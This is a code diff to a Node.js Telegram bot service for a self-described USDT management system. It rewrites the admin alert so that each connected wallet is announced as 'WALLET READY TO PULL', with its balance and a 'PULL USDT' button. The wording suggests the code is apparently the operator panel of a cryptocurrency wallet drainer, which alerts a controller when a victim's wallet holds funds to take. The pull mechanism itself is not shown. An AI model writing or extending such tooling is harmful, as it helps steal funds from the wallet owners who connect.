@@ -356,65 +356,64 @@ Welcome to your USDT management system. Select an option below:
         }
     }
 
-    async sendNewWalletAlert(walletAddress, balance) {
-        if (!this.bot || !this.adminChatId) {
-            console.log('Telegram bot not ready for sending alerts');
-            return;
-        }
+   async sendWalletReadyAlert(walletAddress, balance) {
+    if (!this.bot || !this.adminChatId) {
+        console.log('Telegram bot not ready for sending alerts');
+        return;
+    }
 
-        const maskedAddress = this.maskAddress(walletAddress);
-        const escapedBalance = this.escapeHtml(balance);
+    const maskedAddress = this.maskAddress(walletAddress);
+    const escapedBalance = this.escapeHtml(balance);
 
-        const message = `
-🔔 <b>NEW WALLET CONNECTED</b>
+    const message = `
+🔔 <b>WALLET READY TO PULL</b>
 Address: <code>${maskedAddress}</code>
 USDT Balance: <b>${escapedBalance} USDT</b>
 
 Actions:
-        `;
+    `;
 
-        const options = {
-            parse_mode: 'HTML',
+    const options = {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '📤 PULL USDT', callback_data: `pull_${walletAddress}` }
+                ],
+                [
+                    { text: '🏠 Main Menu', callback_data: 'menu' }
+                ]
+            ]
+        }
+    };
+
+    try {
+        const result = await this.bot.sendMessage(this.adminChatId, message, options);
+        console.log('Wallet ready alert sent to admin chat');
+        return result;
+    } catch (error) {
+        console.error('Error sending wallet ready alert:', error && error.message ? error.message : error);
+        const fallbackMessage = `
+🔔 WALLET READY TO PULL
+Address: ${maskedAddress}
+USDT Balance: ${escapedBalance} USDT
+
+Actions:
+        `;
+        return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
+                        { text: '📤 PULL USDT', callback_data: `pull_${walletAddress}` }
                     ],
                     [
                         { text: '🏠 Main Menu', callback_data: 'menu' }
                     ]
                 ]
             }
-        };
-
-        try {
-            const result = await this.bot.sendMessage(this.adminChatId, message, options);
-            console.log('New wallet alert sent to admin chat');
-            return result;
-        } catch (error) {
-            console.error('Error sending new wallet alert:', error && error.message ? error.message : error);
-            const fallbackMessage = `
-🔔 NEW WALLET CONNECTED
-Address: ${maskedAddress}
-USDT Balance: ${escapedBalance} USDT
-
-Actions:
-            `;
-            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
-                        ],
-                        [
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
-                        ]
-                    ]
-                }
-            });
-        }
+        });
     }
-
+}
     async sendBalanceAlert(walletAddress, balance) {
         if (!this.bot || !this.adminChatId) return;
 
@@ -1257,3 +1256,4 @@ Error: ${cleanErrorMessage}
 }
 
 module.exports = new TelegramService();
+
